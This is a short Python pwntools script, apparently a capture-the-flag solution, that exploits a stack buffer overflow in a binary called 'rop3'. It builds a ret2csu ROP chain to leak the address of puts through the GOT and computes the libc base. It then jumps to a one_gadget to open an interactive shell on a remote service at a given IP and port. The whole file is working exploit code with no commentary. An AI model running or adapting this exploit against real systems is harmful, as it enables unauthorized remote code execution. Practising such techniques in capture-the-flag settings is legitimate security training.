from pwn import *

def csu(rbx, rbp, r12, r13, r14, r15):
    p = p64(0x40069a)
    p += flat(rbx, rbp, r12, r13, r14, r15)
    p += p64(0x400680)
    p += 'a' * 8 * 7
    return p

def call(func, arg1, arg2, arg3):
    raw_input('debug call {}({}, {}, {})'.format(hex(func), hex(arg1), hex(arg2), hex(arg3)))
    p = csu(0, 1, func, arg3, arg2, arg1)
    return p

main = 0x4005f6
plt_puts = 0x4004b0
plt_gets = 0x4004d0
got_puts = 0x601018
got_read = 0x601028
'''
libc_puts_offset = 0x809c0
libc_onegadget_offset = 0x4f2c5
'''
libc_puts_offset = 0x6f690
libc_onegadget_offset = 0x4526a

context.binary = 'rop3'
r = process('rop3')
r = remote('140.110.112.77', 3124)
raw_input('debug')

payload = 'a' * 0x28
payload += call(got_puts, 0x601018, 0, 0)
payload += p64(main)
r.sendline(payload)
r.recvline()
libc_base = u64(r.recvline().strip() + '\0\0') - libc_puts_offset
one_gadget = libc_base + libc_onegadget_offset
print('libc_base: {}, one gadget: {}'.format(hex(libc_base), hex(one_gadget)))

payload = 'a' * 0x28 + p64(one_gadget)
r.sendline(payload)

r.interactive()
